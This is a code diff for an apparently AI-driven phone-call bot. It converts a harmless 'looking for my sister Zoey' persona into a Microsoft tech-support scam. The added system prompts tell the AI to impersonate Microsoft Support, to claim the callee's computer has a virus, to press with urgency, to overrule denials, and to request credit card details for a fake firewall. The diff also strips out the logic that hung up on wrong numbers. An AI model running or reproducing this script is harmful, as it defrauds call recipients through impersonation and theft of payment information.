@@ -98,22 +98,27 @@ const classifyUserIntent = (userInput, conversationHistory) => {
     }
   }
   
-  // Check for Zoey identification responses
+  // Check for scam-related responses
   if (conversationHistory.length <= 5) { // Early in conversation
-    if (/^(yes|yeah|yep|yup|mhm|uh\s*huh)$/i.test(lowerInput)) {
-      return { isIdentification: true, isZoey: true };
+    if (/yes|yeah|yep|yup|i am|i do/i.test(lowerInput)) {
+      return { isScamResponse: true, isFallingForIt: true };
     }
-    if (/^(no|nope|nah|not\s+zoey|wrong\s+number)$/i.test(lowerInput)) {
-      return { isIdentification: true, isZoey: false };
+    if (/no|nope|nah|i don't have a computer|wrong number/i.test(lowerInput)) {
+      return { isScamResponse: true, isFallingForIt: false };
+    }
+    if (/credit card|payment|buy/i.test(lowerInput)) {
+      return { isScamResponse: true, wantsToPay: true };
     }
   }
   
   return { isNormal: true };
 };
 
-const getResponse = async (userInput, callSid) => {
-  const callSidKey = getCallSidKey(callSid);
-  const userId = await redis.get(callSidKey);
+const getResponse = async (userInput, callSid, userId) => {
+  if (!userId) {
+      const callSidKey = getCallSidKey(callSid);
+      userId = await redis.get(callSidKey);
+  }
 
   if (!userId) {
       logger.error('[getResponse] CRITICAL: No user ID mapping found for callSid. Cannot proceed.', { callSid });
@@ -123,103 +128,56 @@ const getResponse = async (userInput, callSid) => {
       };
   }
   
-  const user = await userRepository.findUser({ id: userId });
-  const contact = user || { name: 'there' };
+  const contact = await userRepository.findUser({ id: userId });
   
   try {
     const conversationHistory = await cacheService.getConversation(userId);
     
-    // Classify the user's intent
+    // --- Intent Classification and Contextual System Messages ---
     const userIntent = classifyUserIntent(userInput, conversationHistory);
-    const isConfusionRequest = userIntent.isConfusion || false;
-    
-    logger.info('🎯 [INTENT] User intent classification', {
-      callSid,
-      userId,
-      userInput: userInput.substring(0, 50),
-      intent: userIntent,
-      conversationLength: conversationHistory.length
-    });
-    
-    // Skip cache for confusion requests to ensure context-aware responses
-    let cachedResponse = null;
-    if (!isConfusionRequest) {
-      cachedResponse = await cacheService.getCachedResponse(userInput, conversationHistory);
-    }
-    
-    if (cachedResponse) {
-      logger.info('💾 [CACHE-HIT] Using cached response', {
-        callSid,
-        userId,
-        userInput: userInput.substring(0, 50),
-        cachedResponseLength: cachedResponse.length
-      });
-      
-      // Use appendConversation for consistency
-      const userTurn = { role: 'user', content: userInput };
-      const assistantTurn = { role: 'assistant', content: cachedResponse };
-      await cacheService.appendConversation(userId, userTurn);
-      await cacheService.appendConversation(userId, assistantTurn);
-      
-      // Check for hangup conditions
-      const shouldHangup = cachedResponse.toLowerCase().includes('goodbye') || 
-                          cachedResponse.toLowerCase().includes('thank you for your time');
-      
-      return { text: cachedResponse, shouldHangup };
-    }
-    
-    // No cache hit, proceed with normal flow
+    const lastAssistantMessage = conversationHistory.filter(m => m.role === 'assistant').pop()?.content;
+    const contextualizedHistory = [...conversationHistory];
     const userTurn = { role: 'user', content: userInput };
-    conversationHistory.push(userTurn);
+    contextualizedHistory.push(userTurn);
 
-    // --- Transcript logic is removed from here. It will be handled at the end of the call. ---
-    
-    // --- Generate Prompt with Enhanced Context ---
-    // Extract the last assistant message for confusion handling
-    let lastAssistantMessage = null;
-    for (let i = conversationHistory.length - 1; i >= 0; i--) {
-      if (conversationHistory[i].role === 'assistant') {
-        lastAssistantMessage = conversationHistory[i].content;
-        break;
-      }
-    }
-    
-    // Add context based on user intent
-    let contextualizedHistory = [...conversationHistory];
-    
     if (userIntent.isConfusion && lastAssistantMessage) {
       if (userIntent.requiresRepetition) {
         // User explicitly asked for repetition
         contextualizedHistory.push({
           role: 'system',
-          content: `The user didn't hear or wants you to repeat. Your last message was: "${lastAssistantMessage}". Repeat it clearly, you can rephrase slightly for clarity but keep the same meaning.`
+          content: `The user didn't hear you. Your last message was: "${lastAssistantMessage}". Repeat it with more urgency.`
         });
       } else if (userIntent.requiresClarification) {
         // User is confused about the situation
         contextualizedHistory.push({
           role: 'system',
-          content: `The user seems confused about who you are or why you're calling. Clarify that you're Duy looking for your sister Zoey. Don't just repeat the same question.`
+          content: `The user is confused. Reassure them you are from Microsoft Support and that their computer is in danger. Be firm and serious.`
         });
       } else if (userIntent.confusionType === 'simple_what') {
         // Just "what?" - could be they didn't hear or are confused
         contextualizedHistory.push({
           role: 'system',
-          content: `The user said "${userInput}". Your last message was: "${lastAssistantMessage}". Either repeat it more clearly OR if you've already asked the same question multiple times, try a different approach.`
+          content: `The user said "${userInput}". Your last message was: "${lastAssistantMessage}". Repeat it more clearly and with more urgency.`
         });
       }
     }
     
-    // Handle early identification responses
-    if (userIntent.isIdentification) {
-      if (userIntent.isZoey) {
+    // Handle early scam-related responses
+    if (userIntent.isScamResponse) {
+      if (userIntent.isFallingForIt) {
         contextualizedHistory.push({
           role: 'system',
-          content: `The user just confirmed they ARE Zoey! Now get into your demanding younger brother role and ask for help with homework or other sibling stuff.`
+          content: `The user is agreeing with you. Reinforce the danger and the need for the firewall.`
+        });
+      } else if (userIntent.wantsToPay) {
+        contextualizedHistory.push({
+          role: 'system',
+          content: `The user is asking about payment. This is good. Proceed to ask for their credit card information to purchase the firewall.`
         });
       } else {
         contextualizedHistory.push({
           role: 'system',
-          content: `The user confirmed they are NOT Zoey. You must apologize for the wrong number and end the call immediately.`
+          content: `The user is denying the problem. Be firm, insist that your servers have detected a virus, and that they are in great danger.`
         });
       }
     }
@@ -272,35 +230,20 @@ const getResponse = async (userInput, callSid) => {
     const lowerCaseResponse = aiResponse.toLowerCase();
     const lowerCaseInput = userInput.toLowerCase();
     
-    // isConfusionRequest was already calculated above
+    const isConfusionRequest = userIntent.isConfusion || false;
     
-    // Check if user said they're not Zoey (wrong number scenario)
-    // But be more specific to avoid false positives
-    const notZoeyIndicators = [
-      "i'm not zoey", "not zoey", "wrong number", "you have the wrong", 
-      "this isn't zoey", "no zoey here", "she's not here", "zoey's not here"
+    // Check if user is denying the scam
+    const denialIndicators = [
+      "i don't have a computer", "i don't have a virus", "you are a scammer", 
+      "this is a scam", "i'm calling the police"
     ];
     
-    // Special handling for simple "no" - only treat as not Zoey if it's the whole response
-    // or follows the initial "Is this Zoey?" question
-    const isSimpleNo = lowerCaseInput.trim() === 'no' || 
-                       lowerCaseInput.trim() === 'nope' ||
-                       lowerCaseInput.trim() === 'no it is not';
-    
-    const isNotZoey = notZoeyIndicators.some(indicator => 
+    const isDenial = denialIndicators.some(indicator => 
       lowerCaseInput.includes(indicator)
-    ) || (isSimpleNo && conversationHistory.length <= 3); // Simple no only counts early in conversation
+    );
     
-    // Only hang up if user explicitly says they're not Zoey AND they're not just confused
-    if (isNotZoey && !isConfusionRequest) {
-      logger.info('User clearly indicated they are not Zoey, ending call', { callSid, userInput });
-      shouldHangup = true;
-    } else if (lowerCaseResponse.includes('wrong number') && lowerCaseResponse.includes('sorry')) {
-      // Only hang up if AI explicitly says both "wrong number" AND "sorry"
-      logger.info('AI response indicates wrong number scenario, flagging for hangup', { callSid });
-      shouldHangup = true;
-    } else if (lowerCaseResponse.includes('goodbye') || lowerCaseResponse.includes('have a great day')) {
-      // More specific hangup phrases
+    // Only hang up if AI decides to give up
+    if (lowerCaseResponse.includes('goodbye') || lowerCaseResponse.includes('have a great day')) {
       logger.info('AI response indicates end of conversation, flagging for hangup', { callSid });
       shouldHangup = true;
     }
@@ -373,50 +316,18 @@ const validateAndFixResponse = (response, userIntent, conversationHistory) => {
   const lowerResponse = response.toLowerCase();
   
   // Check for off-character responses
-  if (conversationHistory.length < 10) { // Early in conversation
-    // Ensure we're not talking about math homework before confirming it's Zoey
-    const hasConfirmedZoey = conversationHistory.some(turn => 
-      turn.role === 'user' && /^(yes|yeah|yep|yup|i\s+am|this\s+is\s+zoey)/i.test(turn.content)
-    );
-    
-    if (!hasConfirmedZoey && /homework|calculus|essay|math\s+problem|college/i.test(lowerResponse)) {
-      logger.warn('⚠️ [VALIDATION] Response mentions homework before Zoey confirmation', {
-        originalResponse: response.substring(0, 50),
-        hasConfirmedZoey
+  if (conversationHistory.length < 4) { // Early in conversation
+    if (!/microsoft|support|virus|computer/i.test(lowerResponse)) {
+      logger.warn('⚠️ [VALIDATION] AI response is off-character early in the conversation', {
+        originalResponse: response.substring(0, 50)
       });
-      
-      // Replace with identification-focused response
-      if (userIntent.isConfusion) {
-        return "Sorry, I'm looking for my sister Zoey. Is this her?";
-      } else {
-        return "Wait, is this Zoey? I need to make sure I have the right number.";
-      }
+      return "Hello, this is Ben from Microsoft Support. We have detected a virus on your computer.";
     }
   }
-  
-  // Check for repetitive "is this Zoey" patterns
-  const recentAiResponses = conversationHistory
-    .filter(turn => turn.role === 'assistant')
-    .slice(-3)
-    .map(turn => turn.content.toLowerCase());
-  
-  const isThisZoeyCount = recentAiResponses.filter(r => 
-    /is\s+this\s+zoey|looking\s+for\s+zoey/i.test(r)
-  ).length;
-  
-  if (isThisZoeyCount >= 2 && /is\s+this\s+zoey|looking\s+for\s+zoey/i.test(lowerResponse)) {
-    logger.warn('⚠️ [VALIDATION] Too many "is this Zoey" questions', {
-      count: isThisZoeyCount,
-      recentResponses: recentAiResponses
-    });
-    
-    // Try a different approach
-    return "I'm trying to reach my sister Zoey. If this isn't her, I'll just hang up.";
-  }
-  
-  // Ensure wrong number responses are appropriate
-  if (/wrong\s+number/i.test(lowerResponse) && !/sorry/i.test(lowerResponse)) {
-    return "Oh sorry, wrong number.";
+
+  // Ensure hangup responses are appropriate
+  if (/wrong\s+number/i.test(lowerResponse)) {
+    return "My apologies, I will update my records. Have a good day.";
   }
   
   return response;
